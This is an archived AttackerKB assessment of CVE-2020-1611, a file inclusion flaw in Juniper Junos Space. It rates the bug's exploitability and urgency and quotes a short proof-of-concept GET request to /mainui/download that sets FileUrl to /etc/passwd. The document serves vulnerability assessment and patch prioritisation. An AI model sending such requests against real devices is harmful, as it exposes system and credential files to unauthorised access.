---
title: 'Junos Space: Malicious HTTP packets sent to Junos Space allow an attacker to view all files on the device.'
author: busterb
score: 6
topic_attacker_value: 5
topic_exploitability: 5
topic_disclosure_date: '2020-01-15T09:15:00'
created: '2020-01-30T08:09:03.185426'
revision_date: '2020-04-28T21:09:14.681389'
assessment_id: 71d7629d-b7a9-48be-867b-4abc49a8f155
topic_id: 23437d69-a42d-46bb-b507-61ee0448251f
topic_short_id: cRy9l2YZ4Y
topic_slug: junos-space-malicious-http-packets-sent-to-junos-space-allow-an-attacker-to-view-all-files-on-the-device
akb_topic_url: https://attackerkb.com/topics/cRy9l2YZ4Y/junos-space-malicious-http-packets-sent-to-junos-space-allow-an-attacker-to-view-all-files-on-the-device
akb_assessment_url: https://attackerkb.com/topics/cRy9l2YZ4Y/junos-space-malicious-http-packets-sent-to-junos-space-allow-an-attacker-to-view-all-files-on-the-device#71d7629d-b7a9-48be-867b-4abc49a8f155
author_ratings:
  attacker-value: 5
  confidence-in-ratings: 5
  effort-to-develop-exploit: 1
  exploitability: 5
  reliability: 5
  stability: 5
  urgent-to-patch: 5
---

# Junos Space: Malicious HTTP packets sent to Junos Space allow an attacker to view all files on the device.

*Assessment by busterb, archived from [AttackerKB](https://attackerkb.com/topics/cRy9l2YZ4Y/junos-space-malicious-http-packets-sent-to-junos-space-allow-an-attacker-to-view-all-files-on-the-device#71d7629d-b7a9-48be-867b-4abc49a8f155).*

---

This is a low-risk, high-gain vulnerability, exploiting a path inclusion (which is basically on the same impact as the Citrix ADC (Netscaler) path traversal bug). Though it's probably less likely to find these sitting on the public internet.

PoC from Jin Wook Kim
@wugeej

https://twitter.com/wugeej/status/1222762164626186242

```
[PoC] Juniper Junos Space Local File Inclusion (CVE-2020-1611)

- GET Param:
 (1) Set "Format" to "txt"
 (2) Set "FileUrl" to a local path

- /ect/passwd
GET /mainui/download?X-CSRF=Y581SFvK....53107455361&FileUrl=/etc/passwd&Format=txt&nod... HTTP/1.1
```
